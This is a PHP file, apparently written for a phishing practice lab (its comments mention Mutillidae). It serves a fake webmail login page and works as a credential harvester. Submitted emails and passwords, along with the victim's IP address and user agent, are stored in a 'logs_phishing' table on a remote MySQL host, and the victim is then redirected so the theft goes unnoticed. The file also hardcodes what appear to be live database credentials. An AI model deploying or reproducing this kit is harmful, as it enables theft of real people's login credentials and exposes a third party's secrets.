<?php
// login_falso.php

// --- Configuración de la base de datos de Alwaysdata ---
// ¡REEMPLAZA ESTOS VALORES CON LOS DE TU CUENTA ALWAYSATA!
$db_host = 'mysql-fvalente.alwaysdata.net'; // Por ejemplo: mysql-ejemplo.alwaysdata.net
$db_user = 'fvalente'; // Por ejemplo: tudominio_usuario
$db_pass = 'Pakovalente1'; // ¡Tu contraseña de la base de datos!
$db_name = 'fvalente_capturadatos'; // Por ejemplo: tudominio_db

// --- CONEXIÓN A LA BASE DE DATOS ---
$conexion = new mysqli($db_host, $db_user, $db_pass, $db_name);

// Verificar la conexión
if ($conexion->connect_error) {
    // En un entorno real, esto se loguearía sin mostrar al usuario por seguridad
    die("Conexión fallida a Alwaysdata: " . $conexion->connect_error);
}

// --- Procesamiento del formulario cuando se envía ---
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capturar y sanitizar datos del formulario
    $email = isset($_POST['email']) ? $conexion->real_escape_string($_POST['email']) : 'N/A';
    $password = isset($_POST['password']) ? $conexion->real_escape_string($_POST['password']) : 'N/A';

    // Capturar User-Agent del navegador del usuario
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $conexion->real_escape_string($_SERVER['HTTP_USER_AGENT']) : 'N/A';

    // Capturar IP del usuario
    $ipAddress = isset($_SERVER['REMOTE_ADDR']) ? $conexion->real_escape_string($_SERVER['REMOTE_ADDR']) : 'N/A';

    // Para la geolocalización, es más complejo y generalmente se hace con servicios de terceros.
    // Aquí simulamos un valor. Para una geolocalización real, necesitarías una API (ej. ip-api.com).
    // Ejemplo simple (sin API):
    $geolocalizacion = "Lat: N/A, Lon: N/A (Simulada para " . $ipAddress . ")"; // Podrías añadir más detalle

    // Si quisieras integrar una API de geolocalización (más avanzado):
    /*
    $geolocalizacion = "N/A";
    if ($ipAddress != 'N/A' && $ipAddress != '127.0.0.1') { // Evitar localhost para la API
        $geo_api_url = "http://ip-api.com/json/" . $ipAddress;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $geo_api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $geo_response = curl_exec($ch);
        curl_close($ch);
        $geo_data = json_decode($geo_response, true);

        if ($geo_data && $geo_data['status'] == 'success') {
            $geolocalizacion = "Lat: " . $geo_data['lat'] . ", Lon: " . $geo_data['lon'] . 
                               " (" . $geo_data['city'] . ", " . $geo_data['country'] . ")";
        }
    }
    */

    // --- Insertar datos en la base de datos de Alwaysdata ---
    $stmt = $conexion->prepare("INSERT INTO logs_phishing (email, password, user_agent, ip_address, geolocalizacion) VALUES (?, ?, ?, ?, ?)");
    if ($stmt === false) {
        die("Error al preparar la consulta SQL: " . $conexion->error);
    }
    $stmt->bind_param("sssss", $email, $password, $userAgent, $ipAddress, $geolocalizacion);

    if ($stmt->execute()) {
        // ¡Redirigir al usuario a una página legítima! Esto es CLAVE en el phishing.
        // Para la práctica, redirige a la página principal de Mutillidae o a un sitio real como Google.
        header("Location: http://localhost/"); // Redirige a la página principal de Mutillidae
        exit(); // Es crucial usar exit() después de header()
    } else {
        echo "Error al insertar datos en la base de datos: " . $stmt->error;
    }

    $stmt->close();
}

$conexion->close();
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión - Webmail</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px; text-align: center; }
        .login-container h2 { margin-bottom: 20px; color: #333; }
        .form-group { margin-bottom: 15px; text-align: left; }
        .form-group label { display: block; margin-bottom: 5px; color: #555; }
        .form-group input[type="email"],
        .form-group input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .form-group input[type="submit"] { background-color: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
        .form-group input[type="submit"]:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Accede a tu Correo</h2>
        <form action="" method="POST">
            <div class="form-group">
                <label for="email">Correo Electrónico:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <input type="submit" value="Iniciar Sesión">
            </div>
        </form>
    </div>
</body>
</html>